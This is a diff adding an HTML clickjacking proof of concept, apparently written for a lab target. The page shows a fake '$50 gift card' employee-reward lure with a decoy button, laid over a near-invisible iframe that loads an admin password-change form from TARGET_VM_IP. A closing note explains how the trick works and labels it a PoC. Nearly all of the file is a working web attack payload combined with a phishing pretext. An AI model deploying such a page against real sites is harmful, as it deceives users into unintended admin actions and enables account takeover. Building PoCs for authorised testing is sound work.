@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>FakeCompany — Free Gift Card!</title>
+    <style>
+        body {
+            font-family: system-ui, sans-serif;
+            background: #1a1a2e;
+            color: white;
+            text-align: center;
+            padding: 2rem;
+        }
+        .overlay-frame {
+            position: relative;
+            width: 520px;
+            height: 340px;
+            margin: 2rem auto;
+        }
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 520px;
+            height: 340px;
+            opacity: 0.0001;
+            z-index: 2;
+            border: none;
+        }
+        .decoy {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 520px;
+            height: 340px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border-radius: 16px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 1;
+            pointer-events: none;
+        }
+        .decoy h2 { margin: 0 0 0.5rem; }
+        .fake-btn {
+            background: #fbbf24;
+            color: #1a1a2e;
+            padding: 1rem 2rem;
+            border-radius: 999px;
+            font-weight: 700;
+            font-size: 1.2rem;
+            margin-top: 1rem;
+        }
+        p.hint {
+            color: #94a3b8;
+            font-size: 0.85rem;
+            max-width: 600px;
+            margin: 1rem auto;
+        }
+    </style>
+</head>
+<body>
+    <h1>🎁 Congratulations! You won a $50 gift card</h1>
+    <p>Click the button below to claim your reward from FakeCompany employee appreciation program.</p>
+
+    <div class="overlay-frame">
+        <!-- Vulnerable app has no X-Frame-Options / CSP frame-ancestors -->
+        <iframe src="http://TARGET_VM_IP/admin/settings/password"></iframe>
+        <div class="decoy">
+            <h2>Claim your reward</h2>
+            <p>One click — it's that easy!</p>
+            <div class="fake-btn">CLICK HERE TO CLAIM</div>
+        </div>
+    </div>
+
+    <p class="hint">
+        <strong>PoC only.</strong> This page demonstrates clickjacking: the invisible iframe loads
+        the admin password-change form. The victim thinks they click "Claim reward" but actually
+        interacts with the hidden form. Requires an active admin session in the iframe context.
+    </p>
+</body>
+</html>
